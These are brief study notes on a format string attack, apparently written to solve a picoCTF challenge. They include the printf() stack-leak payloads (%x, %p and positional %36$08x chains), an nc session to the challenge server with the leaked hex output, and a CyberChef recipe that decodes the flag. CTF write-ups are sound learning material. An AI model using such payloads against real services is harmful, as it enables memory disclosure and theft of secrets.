# Lesson  
- Format String Attack  
  - vulnerability of `printf()` and the kind of the function of `c`  
    "%x" and "%p" can extract a value on stack.  
    - input examples
      ```
      # simple
      %x%x%x%x
      > ffaa0340f7d7f374804934678257825

      %36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p
      %36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p

      ```


https://zenn.dev/ri5255/scraps/852f4e4a26965c  
https://note.com/zk_phi/n/nc77f077017d7

# Memo
1. prepare the executable file for debug  
```zsh
$ touch flag.txt
$ echo "my flag yeahhhh" > flag.txt
$ gcc vuln.c -o vuln
$ ./vuln
```

2. test on local

```
my flag yeahhhh
6d 79 20 66 6c 61 67 20 79 65 61 68 68 68 68
```

input
```
%36$08x.%37$08x.%38$08x.%39$08x.%40$08x.%41$08x.%42$08x.%43$08x.%44$08x.%45$08x.%46$08x.%47$08x.%48$08x
```

3. exploit
```zsh
$ nc saturn.picoctf.net 57404
Tell me a story and then I'll tell you one >> %36$08x.%37$08x.%38$08x.%39$08x.%40$08x.%41$08x.%42$08x.%43$08x.%44$08x.%45$08x.%46$08x.%47$08x.%48$08x
Here's a story -
6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.395f6b63.30366635.7d373136.fbad2000.2146c300.00000000
```

4. decode with `CyberCheff`  
[recipe](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,false)From_Hex('Auto')&input=NmY2MzY5NzAuN2I0NjU0NDMuNmIzNDMzNGMuNWY2NzZlMzEuNjczNDZjNDYuNjY2NjMwNWYuMzQ3NDUzNWYuMzk1ZjZiNjMuMzAzNjY2MzUuN2QzNzMxMzYuZmJhZDIwMDAuMjE0NmMzMDAuMDAwMDAwMDA)